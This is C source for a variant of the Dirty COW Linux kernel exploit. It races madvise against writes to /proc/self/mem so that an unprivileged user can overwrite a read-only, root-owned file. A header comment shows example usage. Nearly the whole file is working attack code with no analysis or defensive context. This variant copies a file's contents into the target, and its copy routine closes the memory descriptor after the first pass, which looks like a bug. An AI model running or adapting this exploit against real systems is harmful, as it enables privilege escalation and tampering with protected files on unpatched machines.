/* ####################### dirtyc0w.c ####################### 
   $ sudo -s 
# echo this is not a test > foo 
# chmod 0404 foo 
$ ls -lah foo -r-----r-- 1 root root 19 Oct 20 15:23 foo 
$ cat foo this is not a test 
$ gcc -pthread dirtyc0w.c -o dirtyc0w 
$ ./dirtyc0w foo m00000000000000000 mmap 56123000 madvise 0 procselfmem 1800000000 
$ cat foo m00000000000000000 ####################### dirtyc0w.c ####################### */
#include <stdio.h> 
#include <sys/mman.h> 
#include <fcntl.h> 
#include <pthread.h> 
#include <unistd.h> 
#include <sys/stat.h> 
#include <string.h> 
#include <stdint.h> 
void *map; 
int f; 
struct stat st;
char *name; 
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

int cp(int f, const char *from)
{
    int fd_to, fd_from;
    char buf[4096];
    ssize_t nread;
    int saved_errno;

    fd_from = open(from, O_RDONLY);
    if (fd_from < 0)
        return -1;

    fd_to = f ; 
    if (fd_to < 0)
        goto out_error;

    while (nread = read(fd_from, buf, sizeof buf), nread > 0)
    {
        char *out_ptr = buf;
        ssize_t nwritten;

        do {
            nwritten = write(fd_to, out_ptr, nread);

            if (nwritten >= 0)
            {
                nread -= nwritten;
                out_ptr += nwritten;
            }
            else if (errno != EINTR)
            {
                goto out_error;
            }
        } while (nread > 0);
    }

    if (nread == 0)
    {
        if (close(fd_to) < 0)
        {
            fd_to = -1;
            goto out_error;
        }
        close(fd_from);

        /* Success! */
        return 0;
    }

  out_error:
    saved_errno = errno;

    close(fd_from);
    if (fd_to >= 0)
        close(fd_to);

    errno = saved_errno;
    return -1;
}
void *madviseThread(void *arg) 
{ 
		char *str; 
		str=(char*)arg; 
		int i,c=0; 
		for(i=0;i<100000000;i++) {  
				c+=madvise(map,100,MADV_DONTNEED); }
		printf("madvise %d\n\n",c); } 
void *procselfmemThread(void *arg) 
{ 
		char *str; 
		str=(char*)arg; /* */ 
		int f=open("/proc/self/mem",O_RDWR);
		int i,c=0;
		for(i=0;
						i<100000000;
						i++) { /* You have to reset the file pointer to the memory position. */ lseek(f,(uintptr_t) map,SEEK_SET);
				//c+=write(f,str,strlen(str));
				cp(f, str);
		} printf("procselfmem %d\n\n", c);
} 

int main(int argc,char *argv[]) { 
	if (argc<3) { 
			(void)fprintf(stderr, "%s\n", "usage: dirtyc0w target_file new_content");
		return 1;
} 
	pthread_t pth1,pth2;
f=open(argv[1],O_RDONLY);
fstat(f,&st);
name=argv[1];
map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
perror("");
printf("mmap %zx\n\n",(uintptr_t) map);
/* You have to do it on two threads. */ pthread_create(&pth1,NULL,madviseThread,argv[1]);
pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
/* You have to wait for the threads to finish. */ pthread_join(pth1,NULL);
pthread_join(pth2,NULL);
return 0;
}
